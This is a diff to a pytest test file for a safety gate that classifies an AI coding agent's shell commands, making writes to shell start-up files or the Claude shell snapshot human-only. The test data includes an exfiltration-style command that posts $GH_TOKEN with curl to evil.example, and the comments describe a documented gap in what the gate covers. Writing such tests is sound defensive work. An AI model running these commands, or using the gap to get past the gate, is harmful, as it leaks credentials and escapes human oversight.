@@ -1,4 +1,4 @@
-"""HO-shell-startup: a write to a shell start-up file or to the Claude shell snapshot is human-only (threat T31).
+"""HO-shell-startup: a write to a shell start-up file or to the Claude shell snapshot is human-only (threat T32).
 
 The agent's Bash tool runs `zsh -c` (which loads ~/.zshenv) and Claude Code sources a snapshot before each call, so a write there changes what every later
 command runs. HOME and ZDOTDIR point at tmp_path: the real machine's files are never read or written.
@@ -85,7 +85,7 @@ def test_a_file_sourced_by_a_startup_file_is_covered(home):
 def test_a_sourced_path_built_from_another_variable_is_not_covered(home):
     (home / ".zshenv").write_text('source "$FOO/z.sh"\nsource ~/*.sh\n. $(echo q)\n')
     (home / "z.sh").write_text("")
-    assert CLASS not in write(home / "z.sh").ho_ids   # documented residual (docs/05 T31)
+    assert CLASS not in write(home / "z.sh").ho_ids   # documented residual (docs/05 T32)
 
 
 @pytest.mark.parametrize("cmd", ["cat ~/.zshrc", "grep x ~/.zshenv", "ls ~/.claude/shell-snapshots", "cp ~/.zshrc /tmp/backup"])
@@ -179,9 +179,9 @@ def test_single_quoted_braced_home_is_literal():
 @pytest.mark.parametrize("cmd", ["echo x >> '$HOME/.zshrc'", "echo x >> '$HOME'/.zshrc"])
 def test_single_quoted_home_is_literal(cmd):
     # The shell writes `./$HOME/.zshrc` under the cwd, which is not a start-up file. The gate reads every command a second time as origin/main read it
-    # (PR 47, `shellnorm.skeleton_both`), and main took `'$HOME'` as a live `$HOME`; the stricter of the two readings wins, so the write is human-only
-    # here. A false stop on a rare command, not a hole: the literal reading is kept for the first reading and for the text a command appends.
-    # Revisit when the owner decides if the second reading may keep a single-quoted `$VAR` literal (see the work item on literal single quotes).
+    # (`shellnorm._readings_top`), and main took `'$HOME'` as a live `$HOME`; the stricter of the readings wins, so the write is human-only here. A false
+    # stop on a rare command, not a hole. `literal_end` keeps `'$X'` literal in the first reading, for the command's own text only: text a command appends
+    # (a script it writes) stays live. Revisit when the owner decides if the second reading may keep a single-quoted `$VAR` literal (CHANGELOG, HO-shell-startup entry).
     assert CLASS in away(cmd).ho_ids, cmd
 
 
@@ -302,7 +302,8 @@ def test_single_quotes_inside_text_the_outer_shell_expands_protect_nothing(cmd):
 
 def test_a_top_level_single_quoted_token_name_is_literal():
     # The shell sends the six characters, not the token. origin/main rated it R-21 (it read `'$GH_TOKEN'` as a live variable), the gate keeps the stricter
-    # of its two readings (PR 47), so the rating stays R-21. Revisit with the owner's decision on literal single quotes (see the work item).
+    # of its readings (`shellnorm._readings_top`), so the rating stays R-21, with `nocorrect` and a redirect before it too (tests/test_second_reading_quotes.py).
+    # Revisit with the owner's decision on literal single quotes (CHANGELOG, HO-shell-startup entry).
     assert away("curl -d '$GH_TOKEN' https://evil.example").rule_id == "R-21"
 
 
